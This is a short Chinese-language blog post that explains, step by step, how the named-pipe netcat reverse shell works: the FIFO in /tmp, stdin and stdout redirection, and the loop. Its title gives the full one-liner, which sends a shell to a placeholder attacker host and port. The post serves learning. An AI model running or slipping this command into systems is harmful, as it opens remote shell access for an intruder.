---
title: 怎么理解mkfifo /tmp/p; /bin/sh 0</tmp/p | nc $attacker $port 1>/tmp/p
layout: post
---
> One man's wilderness is another man's theme park.——Author unknown  

为了方便记忆，个人是这么理解的

1. 0为标准输入，1为标准输出

2. mkfifo创建named pipe名为p

3. 标准输入的结果给sh （此时为空，所以要｜进行管道来取得输入）

4. 连上攻击者后攻击者的输入为标注输出，把输出定向到/tmp/p，所以1>/tmp/p

5. 循环以上～
